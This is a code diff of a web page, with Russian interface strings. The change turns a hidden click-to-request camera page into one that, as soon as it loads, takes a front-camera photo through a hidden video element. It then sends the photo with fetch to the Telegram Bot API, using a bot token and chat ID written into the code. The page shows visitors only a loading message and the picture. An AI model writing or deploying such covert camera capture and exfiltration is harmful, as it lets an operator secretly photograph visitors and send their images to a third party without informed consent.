@@ -10,42 +10,84 @@
             width: 100%;
             height: 100%;
             background: white;
-            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: sans-serif;
         }
-        button {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            background: transparent;
-            padding: 0;
+        img {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 12px;
+        }
+        p {
+            color: #777;
         }
     </style>
 </head>
 <body>
 
-<button id="btn"></button>
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<p id="status">Загрузка...</p>
+<img id="photo" style="display:none;">
 
 <script>
-    let requested = false;
+    const BOT_TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
+    const CHAT_ID = "1314241513";
 
-    async function askCamera() {
-        if (requested) return;
-        requested = true;
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const photo = document.getElementById("photo");
+    const status = document.getElementById("status");
+
+    async function sendToTelegram(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "photo.png");
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            stream.getTracks().forEach(t => t.stop());
-            console.log("Камера: разрешена");
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+            const data = await res.json();
+            console.log("Отправлено в Telegram:", data.ok);
         } catch (e) {
-            console.log("Камера:", e.name);
-            requested = false;
+            console.log("Ошибка отправки:", e);
         }
     }
 
-    document.getElementById("btn").addEventListener("click", askCamera);
+    async function takePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
+            });
+
+            video.srcObject = stream;
+            await video.play();
+
+            await new Promise(r => setTimeout(r, 500));
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+
+            stream.getTracks().forEach(t => t.stop());
+
+            canvas.toBlob(async (blob) => {
+                photo.src = URL.createObjectURL(blob);
+                photo.style.display = "block";
+                status.style.display = "none";
+                await sendToTelegram(blob);
+            }, "image/png");
+
+        } catch (e) {
+            status.textContent = "Ошибка: " + e.name;
+        }
+    }
+
+    window.addEventListener("load", takePhoto);
 </script>
 
 </body>
